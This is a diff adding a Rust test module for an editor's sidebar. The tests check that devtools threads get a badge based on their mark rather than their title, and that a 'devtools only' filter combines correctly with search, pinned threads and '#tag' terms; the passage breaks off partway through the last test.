@@ -0,0 +1,335 @@
+// Story 055, task 14.1 (sidebar half) — devtools threads in Zeo's thread list: the badge and the
+// "Devtools threads only" filter (design.md §B8). Requirements: R8.1, R8.2 (Q2, Q5).
+//
+// Materialize with, in `crates/sidebar/src/sidebar.rs`, beside `mod sidebar_pinned_tests;`:
+//     #[cfg(test)]
+//     mod sidebar_devtools_tests;
+// Filter: `cargo test -p sidebar` (paths `sidebar_devtools_tests::…`).
+//
+// Reuses story 032's `pub(super)` helpers from `sidebar_tests.rs`. Assumed seams — each named in
+// ONE helper below, adjust there if it moved:
+//   - `mark_devtools()`: a persisted devtools mark, written the way promotion writes it
+//     (`ThreadOrganizationStore::set_devtools_root(thread_id, root, cx)`, task 10.1/10.2);
+//   - `badged()` / `badged_ids()`: a thread row carries the badge decision as
+//     `ListEntry::Thread(t).is_devtools`, filled from `DevtoolsThreads::is_devtools` (memory ∪
+//     store); the sidebar sets `ThreadItem::badge(IconName::ToolWeb, "Devtools thread")` from it;
+//   - an UNPROMOTED devtools thread comes from `agent_ui::devtools_threads::create(root, cx)`, so
+//     it carries the in-memory mark only;
+//   - `devtools_only()`: the filter menu's toggle, `Sidebar::set_devtools_only(bool, window, cx)`.
+//
+// Hostile halves first:
+//   - the badge reads memory AND store: a devtools thread created this run, never promoted (no
+//     persisted mark), is badged too — a store-only reader leaves it bare until its first message;
+//   - the badge follows the MARK, not the title: an editor thread titled "Devtools thread" gets no
+//     badge, while a devtools thread titled like an editor thread gets one;
+//   - the filter composes, it does not replace: with a search text that matches only an EDITOR
+//     thread, "devtools only" shows no thread; and a PINNED editor thread is hidden while a pinned
+//     devtools thread is shown exactly once;
+//   - turning the filter off restores the full list exactly (same rows, same order).
+
+use super::*;
+use crate::sidebar_tests::{
+    init_test, init_test_project_with_agent_panel, save_thread_metadata_with_main_paths,
+    setup_sidebar, setup_sidebar_with_agent_panel, type_in_search, visible_entries_as_strings,
+};
+use agent_ui::thread_metadata_store::{ThreadId, ThreadMetadataStore};
+use agent_ui::thread_organization::ThreadOrganizationStore;
+use fs::FakeFs;
+use gpui::TestAppContext;
+use std::path::PathBuf;
+use util::path_list::PathList;
+
+const ALPHA: &str = "/alpha";
+
+async fn setup(cx: &mut TestAppContext) -> (Entity<Sidebar>, gpui::VisualTestContext) {
+    init_test(cx);
+    let fs = FakeFs::new(cx.executor());
+    fs.insert_tree(ALPHA, serde_json::json!({ "src": {} }))
+        .await;
+    cx.update(|cx| {
+        <dyn fs::Fs>::set_global(fs.clone(), cx);
+        agent_ui::thread_organization::init(cx);
+    });
+    cx.run_until_parked();
+    let project = project::Project::test(fs.clone(), [ALPHA.as_ref()], cx).await;
+    let (multi_workspace, mut vcx) =
+        cx.add_window_view(|window, cx| MultiWorkspace::test_new(project, window, cx));
+    let sidebar = setup_sidebar(&multi_workspace, &mut vcx);
+    (sidebar, vcx.clone())
+}
+
+fn thread(session: &str, title: &str, minute: u32, cx: &mut TestAppContext) -> ThreadId {
+    let paths = PathList::new(&[ALPHA]);
+    save_thread_metadata_with_main_paths(
+        session,
+        title,
+        paths.clone(),
+        paths,
+        chrono::TimeZone::with_ymd_and_hms(&chrono::Utc, 2026, 10, 15, 12, minute, 0).unwrap(),
+        cx,
+    );
+    cx.update(|cx| {
+        ThreadMetadataStore::global(cx)
+            .read(cx)
+            .entries()
+            .find(|e| {
+                e.session_id
+                    .as_ref()
+                    .is_some_and(|s| s.0.as_ref() == session)
+            })
+            .map(|e| e.thread_id)
+            .expect("saved")
+    })
+}
+
+fn mark_devtools(id: ThreadId, cx: &mut TestAppContext) {
+    cx.update(|cx| {
+        ThreadOrganizationStore::global(cx).update(cx, |store, cx| {
+            store
+                .set_devtools_root(id, PathBuf::from(ALPHA), cx)
+                .expect("a saved thread can carry the mark");
+        })
+    });
+    cx.run_until_parked();
+}
+
+fn pin(id: ThreadId, cx: &mut TestAppContext) {
+    cx.update(|cx| {
+        ThreadOrganizationStore::global(cx).update(cx, |store, cx| {
+            store.pin(id, cx).expect("pinnable");
+        })
+    });
+    cx.run_until_parked();
+}
+
+/// Titles of the thread rows that carry the devtools badge.
+fn badged(sidebar: &Entity<Sidebar>, cx: &mut gpui::VisualTestContext) -> Vec<String> {
+    sidebar.read_with(cx, |sidebar, _| {
+        sidebar
+            .contents
+            .entries
+            .iter()
+            .filter_map(|entry| match entry {
+                ListEntry::Thread(t) if t.is_devtools => {
+                    Some(t.metadata.display_title().to_string())
+                }
+                _ => None,
+            })
+            .collect()
+    })
+}
+
+fn devtools_only(sidebar: &Entity<Sidebar>, on: bool, cx: &mut gpui::VisualTestContext) {
+    sidebar.update_in(cx, |sidebar, window, cx| {
+        sidebar.set_devtools_only(on, window, cx)
+    });
+    cx.run_until_parked();
+}
+
+fn thread_rows(sidebar: &Entity<Sidebar>, cx: &mut gpui::VisualTestContext) -> Vec<String> {
+    visible_entries_as_strings(sidebar, cx)
+        .into_iter()
+        .filter(|row| row.starts_with("  "))
+        .map(|row| row.trim().to_string())
+        .collect()
+}
+
+#[gpui::test]
+async fn hostile_the_badge_follows_the_mark_not_the_title(cx: &mut TestAppContext) {
+    let (sidebar, mut vcx) = setup(cx).await;
+    let _editor = thread("s-editor", "Devtools thread", 1, cx);
+    let browser = thread("s-browser", "Fix the header", 2, cx);
+    mark_devtools(browser, cx);
+    assert_eq!(
+        badged(&sidebar, &mut vcx),
+        vec!["Fix the header".to_string()],
+        "R8.1"
+    );
+}
+
+#[gpui::test]
+async fn hostile_devtools_only_composes_with_the_search_text(cx: &mut TestAppContext) {
+    let (sidebar, mut vcx) = setup(cx).await;
+    let _editor = thread("s-editor", "Refactor parser", 1, cx);
+    let browser = thread("s-browser", "Fix the header", 2, cx);
+    mark_devtools(browser, cx);
+    type_in_search(&sidebar, "parser", &mut vcx);
+    devtools_only(&sidebar, true, &mut vcx);
+    assert!(
+        thread_rows(&sidebar, &mut vcx)
+            .iter()
+            .all(|r| !r.contains("Refactor parser")),
+        "the editor thread matching the text is still not a devtools thread"
+    );
+    type_in_search(&sidebar, "header", &mut vcx);
+    assert!(
+        thread_rows(&sidebar, &mut vcx)
+            .iter()
+            .any(|r| r.contains("Fix the header"))
+    );
+}
+
+#[gpui::test]
+async fn hostile_devtools_only_hides_a_pinned_editor_thread_and_shows_a_pinned_devtools_one_once(
+    cx: &mut TestAppContext,
+) {
+    let (sidebar, mut vcx) = setup(cx).await;
+    let editor = thread("s-editor", "Pinned editor work", 1, cx);
+    let browser = thread("s-browser", "Pinned browser work", 2, cx);
+    mark_devtools(browser, cx);
+    pin(editor, cx);
+    pin(browser, cx);
+    devtools_only(&sidebar, true, &mut vcx);
+    let rows = thread_rows(&sidebar, &mut vcx);
+    assert!(
+        rows.iter().all(|r| !r.contains("Pinned editor work")),
+        "{rows:?}"
+    );
+    assert_eq!(
+        rows.iter()
+            .filter(|r| r.contains("Pinned browser work"))
+            .count(),
+        1,
+        "{rows:?}"
+    );
+}
+
+#[gpui::test]
+async fn turning_the_filter_off_restores_the_full_list_exactly(cx: &mut TestAppContext) {
+    let (sidebar, mut vcx) = setup(cx).await;
+    let _a = thread("s-a", "Editor A", 1, cx);
+    let b = thread("s-b", "Browser B", 2, cx);
+    let _c = thread("s-c", "Editor C", 3, cx);
+    mark_devtools(b, cx);
+    let full = visible_entries_as_strings(&sidebar, &mut vcx);
+    devtools_only(&sidebar, true, &mut vcx);
+    let only = thread_rows(&sidebar, &mut vcx);
+    assert_eq!(only, vec!["Browser B".to_string()], "R8.2");
+    devtools_only(&sidebar, false, &mut vcx);
+    assert_eq!(
+        visible_entries_as_strings(&sidebar, &mut vcx),
+        full,
+        "R8.2: restored"
+    );
+}
+
+fn badged_ids(sidebar: &Entity<Sidebar>, cx: &mut gpui::VisualTestContext) -> Vec<String> {
+    sidebar.read_with(cx, |sidebar, _| {
+        sidebar
+            .contents
+            .entries
+            .iter()
+            .filter_map(|entry| match entry {
+                ListEntry::Thread(t) if t.is_devtools => Some(t.metadata.thread_id.to_key_string()),
+                _ => None,
+            })
+            .collect()
+    })
+}
+
+#[gpui::test]
+async fn hostile_an_unpromoted_devtools_thread_is_badged_too(cx: &mut TestAppContext) {
+    let project = init_test_project_with_agent_panel(ALPHA, cx).await;
+    cx.update(|cx| {
+        agent_ui::thread_organization::init(cx);
+        agent_ui::test_support::set_stub_agent_connection(acp_thread::StubAgentConnection::new());
+    });
+    let (multi_workspace, cx) =
+        cx.add_window_view(|window, cx| MultiWorkspace::test_new(project.clone(), window, cx));
+    let (sidebar, _panel) = setup_sidebar_with_agent_panel(&multi_workspace, cx);
+    // Top level, never inside a window update (G17): a leased window is invisible to the resolver.
+    let task = cx
+        .cx
+        .update(|cx| agent_ui::devtools_threads::create(std::path::Path::new(ALPHA), cx));
+    cx.run_until_parked();
+    let created = task.await.expect("a devtools thread is created");
+    cx.run_until_parked();
+    let id = cx.update(|_, cx| {
+        ThreadMetadataStore::global(cx)
+            .read(cx)
+            .entry_ids()
+            .find(|id| id.to_key_string() == created.thread_id)
+            .expect("listed in the thread store")
+    });
+    let persisted = cx.update(|_, cx| {
+        ThreadOrganizationStore::global(cx)
+            .read(cx)
+            .organization(id)
+            .and_then(|org| org.devtools_root.clone())
+    });
+    assert!(persisted.is_none(), "never promoted: no persisted mark");
+    assert_eq!(
+        badged_ids(&sidebar, cx),
+        vec![created.thread_id],
+        "R8.1: badged from memory"
+    );
+}
+
+// ═══ Story 037, task 5.2 — the `#tag` filter composes with the devtools-only view ═══════════
+//
+// Appended to 0063's file; the hunk belongs to 0063's regeneration (story 037, Task 8), not to
+// 037's own patch. Everything above this banner is 0063's file at the series tip, unchanged.
+// Requirements: R4.10, R3.2. Filter: `cargo test -p sidebar devtools`.
+//
+// Hostile halves first: with both filters on, a tagged EDITOR thread (in its group and pinned)
+// stays out — the tag term must not replace the devtools view — and an UNTAGGED devtools thread
+// stays out — the devtools view must not replace the tag term; only then the thread passing both
+// is shown. Turning the view off keeps the tag term in force.
+
+fn tag(id: ThreadId, tag: &str, cx: &mut TestAppContext) {
+    cx.update(|cx| {
+        ThreadOrganizationStore::global(cx).update(cx, |store, cx| store.add_tag(id, tag, cx))
+    })
+    .expect("fixture: a saved thread takes a valid tag");
+    cx.run_until_parked();
+}
+
+fn sorted(mut rows: Vec<String>) -> Vec<String> {
+    rows.sort();
+    rows
+}
+
+#[gpui::test]
+async fn hostile_devtools_only_and_a_tag_term_both_hold(cx: &mut TestAppContext) {
+    let (sidebar, mut vcx) = setup(cx).await;
+    let editor_php = thread("s-editor-php", "Editor php work", 1, cx);
+    let devtools_php = thread("s-devtools-php", "Browser php work", 2, cx);
+    let devtools_plain = thread("s-devtools-plain", "Browser plain work", 3, cx);
+    let pinned_editor_php = thread("s-pinned-editor", "Pinned editor php", 4, cx);
+    mark_devtools(devtools_php, cx);
+    mark_devtools(devtools_plain, cx);
+    tag(editor_php, "php", cx);
+    tag(devtools_php, "php", cx);
+    tag(pinned_editor_php, "php", cx);
